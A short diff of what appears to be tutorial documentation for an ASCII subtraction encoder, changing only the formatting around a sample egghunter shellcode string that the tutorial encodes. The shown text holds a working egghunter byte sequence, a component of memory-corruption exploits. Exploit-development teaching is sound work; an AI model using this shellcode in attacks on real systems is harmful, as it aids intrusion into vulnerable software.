@@ -70,9 +70,9 @@ The following screenshot shows the usage information
 
 Now, lets say we want to encode the following egghunter shellcode
 
-```
+<pre style="white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 \x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7
-```
+</pre>
 
 The following command can be used to run the executable and produce the Ascii Subtraction Encoder instructions which used to encode the egghunter
 
